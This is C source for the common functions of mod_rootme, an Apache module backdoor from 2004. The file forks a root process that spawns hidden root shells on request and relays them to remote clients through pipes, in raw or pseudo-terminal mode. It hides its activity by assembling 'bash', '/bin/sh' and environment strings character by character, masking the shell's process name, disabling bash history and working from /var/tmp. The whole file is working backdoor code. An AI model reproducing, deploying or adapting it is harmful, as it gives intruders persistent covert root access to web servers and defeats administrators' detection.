/*
 *  Common functions for mod_rootme{,2}
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>

#if defined LINUX || defined OSF
  #include <pty.h>
#else
#if defined FREEBSD
  #include <libutil.h>
#else
#if defined OPENBSD
  #include <util.h>
#else
#if defined SUNOS || defined HPUX
  #include <sys/stropts.h>
#else
#if ! defined CYGWIN && ! defined IRIX
  #error Undefined host system
#endif
#endif
#endif
#endif
#endif

#define MAX_SHELLS         16
#define GET_RAW_SHELL   0x100
#define GET_PTY_SHELL   0x200

#define EXIT_STRING     "\xFF\x01\xFE\x02"

int pidlist[MAX_SHELLS];
int pipe_A[MAX_SHELLS][2];
int pipe_B[MAX_SHELLS][2];

void runshell_raw( int rd_pipe, int wr_pipe );
void runshell_pty( int rd_pipe, int wr_pipe );

void shell_spooler( void )
{
    fd_set rfds;
    int pid, ppid;
    int get_type, x;
    struct timeval tv;

    if( ttyname( 0 ) ) return;

    /* create the necessary pipes and fork */

    for( x = 0; x < MAX_SHELLS; x++ )
    {
        pidlist[x] = 0;
        pipe( pipe_A[x] );
        pipe( pipe_B[x] );
    }

    if( fork() ) return;

    ppid = getppid();

    while( 1 )
    {
        /* check if our father is still alive */

        if( getppid() != ppid ) exit( 0 );

        /* make sure there's no dead processes around */

        if( ( pid = waitpid( -1, NULL, WNOHANG ) ) > 0 )
        {
            for( x = 1; x < MAX_SHELLS; x++ )
            {
                if( pidlist[x] == pid )
                {
                    pidlist[x] = 0;
                    write( pipe_B[x][1], EXIT_STRING, 4 );
                }
            }
        }

        /* wait until a child wants root privileges */

        FD_ZERO( &rfds );
        FD_SET( pipe_A[0][0], &rfds );

        tv.tv_sec  = 1;
        tv.tv_usec = 0;

        if( select( pipe_A[0][0] + 1, &rfds, NULL, NULL, &tv ) < 0 )
            exit( 0 );

        if( FD_ISSET( pipe_A[0][0], &rfds ) )
        {
            read( pipe_A[0][0], &x, sizeof( x ) );

            if( x < MAX_SHELLS )
            {
                /* got a "kill the shell" request */

                if( pidlist[x] )
                {
                    kill( pidlist[x], 9 );
                    pidlist[x] = 0;
                }

                continue;
            }

            /* got a "spawn rootshell" request */

            get_type = x;

            for( x = 1; x < MAX_SHELLS; x++ )
                if( pidlist[x] == 0 ) break;

            write( pipe_B[0][1], &x, sizeof( x ) );

            if( x == MAX_SHELLS ) continue;

            if( ! ( pid = fork() ) )
            {
                int i;
                char r_banner[17];

                /* close all unnecessary descriptors */

                for( i = 0; i < 1024; i++ )
                {
                    if( i == pipe_A[x][0] ||
                        i == pipe_B[x][1] )
                        continue;

                    close( i );
                }

                r_banner[0] = 'r'; r_banner[ 8] = '.';
                r_banner[1] = 'o'; r_banner[ 9] = '3';
                r_banner[2] = 'o'; r_banner[10] = ' ';
                r_banner[3] = 't'; r_banner[11] = 'r';
                r_banner[4] = 'm'; r_banner[12] = 'e';
                r_banner[5] = 'e'; r_banner[13] = 'a';
                r_banner[6] = '-'; r_banner[14] = 'd';
                r_banner[7] = '0'; r_banner[15] = 'y';

                write( pipe_B[x][1], r_banner, 16 );

                if( get_type == GET_RAW_SHELL )
                {
                    write( pipe_B[x][1], "\n", 1 );
                    runshell_raw( pipe_A[x][0], pipe_B[x][1] );
                }

                if( get_type == GET_PTY_SHELL )
                    runshell_pty( pipe_A[x][0], pipe_B[x][1] );

                exit( 0 );
            }

            if( pid > 0 ) pidlist[x] = pid;
        }
    }
}

void process_client( int get_type, int client_fd )
{
    int n, x;
    fd_set rfds;
    char buffer[4096];

    /* ask the master process for a rootshell */

    x = get_type;
    n = write( pipe_A[0][1], &x, sizeof( x ) );

    if( n != sizeof( x ) )
        exit( 0 );

    n = read( pipe_B[0][0], &x, sizeof( x ) );

    if( n != sizeof( x ) )
        exit( 0 );

    if( x == MAX_SHELLS )
        exit( 0 );

    /* tranfer the data between client and rootshell */

    while( 1 )
    {
        FD_ZERO( &rfds );
        FD_SET( pipe_B[x][0], &rfds );

        FD_SET( client_fd, &rfds );

        n = ( pipe_B[x][0] > client_fd )
            ? pipe_B[x][0] : client_fd;

        if( select( n + 1, &rfds, NULL, NULL, NULL ) < 0 )
            exit( 0 );

        if( FD_ISSET( pipe_B[x][0], &rfds ) )
        {
            n = read( pipe_B[x][0], buffer, sizeof( buffer ) );

            if( n <= 0 ) break;

            if( ! strncmp( buffer, EXIT_STRING, 4 ) )
            {
                shutdown( client_fd, 2 );
                exit( 0 );
            }

            if( send( client_fd, buffer, n, 0 ) != n )
                break;
        }

        if( FD_ISSET( client_fd, &rfds ) )
        {
            n = recv( client_fd, buffer, sizeof( buffer ), 0 );

            if( n <= 0 ) break;

            if( write( pipe_A[x][1], buffer, n ) != n )
                break;
        }
    }

    /* tell the master process to kill the shell */

    shutdown( client_fd, 2 );

    write( pipe_A[0][1], &x, sizeof( x ) );

    exit( 0 );
}

void runshell_raw( int rd_pipe, int wr_pipe )
{
    char shell_path[8];

    setsid();
    dup2( rd_pipe, 0 );
    dup2( wr_pipe, 1 );
    dup2( wr_pipe, 2 );

    shell_path[0] = 'b'; shell_path[2] = 's';
    shell_path[1] = 'a'; shell_path[3] = 'h';
    shell_path[4] = '\0';
    execlp( shell_path, HIDE_SHELL, (char *) 0 );

    shell_path[0] = '/'; shell_path[4] = '/';
    shell_path[1] = 'b'; shell_path[5] = 's';
    shell_path[2] = 'i'; shell_path[6] = 'h';
    shell_path[3] = 'n'; shell_path[7] = '\0';
    execlp( shell_path, HIDE_SHELL, (char *) 0 );

    return;
}

void runshell_pty( int rd_pipe, int wr_pipe )
{
    fd_set rfds;
    struct winsize ws;
    int pid, pty, tty, n;
    char *slave, *temp;
    char buffer[4096];

    /* request a pseudo-terminal */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
        return;

    if( ! ( slave = ttyname( tty ) ) )
        return;

#else
#if defined IRIX

    if( ! ( slave = _getpty( &pty, O_RDWR, 0622, 0 ) ) )
        return;

    if( ( tty = open( slave, O_RDWR | O_NOCTTY ) ) < 0 )
        return;

#else
#if defined CYGWIN || defined SUNOS || defined HPUX

    if( ( pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY ) ) < 0 )
        return;

    if( grantpt( pty ) < 0 )
        return;

    if( unlockpt( pty ) < 0 )
        return;

    if( ! ( slave = ptsname( pty ) ) )
        return;

    if( ( tty = open( slave, O_RDWR | O_NOCTTY ) ) < 0 )
        return;

#if defined SUNOS || defined HPUX

    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
        return;

    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
        return;

#if defined SUNOS

    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
        return;

#endif
#endif
#endif
#endif
#endif

    /* get the window size and TERM variable */

    memset( buffer, 0, sizeof( buffer ) );

    if( ( n = read( rd_pipe, buffer, 64 ) ) != 64 )
        return;

    ws.ws_row = ( (int) buffer[0] << 8 ) + (int) buffer[1];
    ws.ws_col = ( (int) buffer[2] << 8 ) + (int) buffer[3];

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
        return;

    if( ! ( temp = (char *) malloc( 66 ) ) )
        return;

    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy( temp + 5, buffer + 4, 61 );

    putenv( temp );

    /* fork to spawn a shell */

    if( ( pid = fork() ) < 0 )
        return;

    if( ! pid )
    {
        close( pty );

        if( setsid() < 0 )
            return;

        /* set controlling tty, to have job control */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
            return;

#else
#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX

        {
            int fd = open( slave, O_RDWR );
            if( fd < 0 ) return;
            close( tty );
            tty = fd;
        }

#endif
#endif

        /* tty becomes stdin, stdout, stderr */

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 ) close( tty );

        /* just in case bash is run, kill the history file */

        if( ! ( temp = (char *) malloc( 10 ) ) )
            return;

        temp[0] = 'H'; temp[5] = 'I';
        temp[1] = 'I'; temp[6] = 'L';
        temp[2] = 'S'; temp[7] = 'E';
        temp[3] = 'T'; temp[8] = '=';
        temp[4] = 'F'; temp[9] = '\0';

        putenv( temp );

        /* set HOME to "/var/tmp" */

        if( ! ( temp = (char *) malloc( 14 ) ) )
            return;

        temp[0] = 'H'; temp[ 7] = 'a';
        temp[1] = 'O'; temp[ 8] = 'r';
        temp[2] = 'M'; temp[ 9] = '/';
        temp[3] = 'E'; temp[10] = 't';
        temp[4] = '='; temp[11] = 'm';
        temp[5] = '/'; temp[12] = 'p';
        temp[6] = 'v'; temp[13] = '\0';

        putenv( temp );
        chdir( temp + 5 );

        /* fire up the shell */

        buffer[0] = 'b'; buffer[2] = 's';
        buffer[1] = 'a'; buffer[3] = 'h';
        buffer[4] = '\0';
        execlp( buffer, HIDE_SHELL, (char *) 0 );

        buffer[0] = '/'; buffer[4] = '/';
        buffer[1] = 'b'; buffer[5] = 's';
        buffer[2] = 'i'; buffer[6] = 'h';
        buffer[3] = 'n'; buffer[7] = '\0';
        execlp( buffer, HIDE_SHELL, (char *) 0 );

        return;
    }

    /* tty (slave side) not needed anymore */

    close( tty );

    /* let's forward the data back and forth */

    while( 1 )
    {
        FD_ZERO( &rfds );
        FD_SET( rd_pipe, &rfds );
        FD_SET( pty, &rfds );

        n = ( pty > rd_pipe ) ? pty : rd_pipe;

        if( select( n + 1, &rfds, NULL, NULL, NULL ) < 0 )
            break;

        if( FD_ISSET( rd_pipe, &rfds ) )
        {
            n = read( rd_pipe, buffer, sizeof( buffer ) );

            if( n <= 0 ) break;

            if( write( pty, buffer, n ) != n )
                break;
        }

        if( FD_ISSET( pty, &rfds ) )
        {
            n = read( pty, buffer, sizeof( buffer ) );

            if( n <= 0 ) break;

            if( write( wr_pipe, buffer, n ) != n )
                break;
        }
    }

    return;
}
